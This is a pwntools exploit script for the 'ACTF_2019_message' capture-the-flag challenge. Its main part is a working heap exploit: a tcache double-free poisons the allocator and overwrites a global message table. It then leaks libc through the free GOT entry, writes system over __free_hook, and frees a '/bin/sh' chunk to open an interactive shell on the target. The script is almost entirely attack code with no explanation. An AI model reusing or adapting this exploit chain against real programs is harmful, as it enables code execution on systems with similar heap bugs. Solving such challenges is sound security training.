import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
from FILE import *
binary='ACTF_2019_message'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',27107)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			# io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			libc=ELF('../../x64libc/libc.so.6')
			one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c):
			io.sendlineafter("What's your choice: ",'1')
			io.sendlineafter('Please input the length of message:',str(a))
			io.sendafter('Please input the message:',c)

		def delete(a):
			io.sendlineafter("What's your choice: ",'2')
			io.sendlineafter('Please input index of message you want to delete:',str(a))

		def edit(a,c):
			io.sendlineafter("What's your choice: ",'3')
			io.sendlineafter('Please input index of message you want to edit:',str(a))
			io.sendafter('Now you can edit the message:',c)

		def show(a):
			io.sendlineafter("What's your choice: ",'4')
			io.sendlineafter('Please input index of message you want to display:',str(a))
		


		add(0x68,'aaaa')
		add(0x68,'aaaa')
		delete(0)
		delete(0)
		add(0x68,p64(0x602060))
		add(0x68,'/bin/sh\x00')
		add(0x68,p64(9))
		edit(4,p64(0x1000)+p64(0x602078)+p64(0x10100)+p64(elf.got['free']))
		show(1)
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['free']
		libc.address=libc_base
		ld.address=0x3f1000+libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		edit(0,p64(libc.sym['__free_hook'])+p64(0x10)+p64(ld.sym['_rtld_global']+3848))
		# edit(1,'sh\x00')
		edit(1,p64(system_addr))
		# io.sendline('5')
		delete(3)
		

		






		success('libc_base:'+hex(libc_base))
		# pdbg.bp([])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue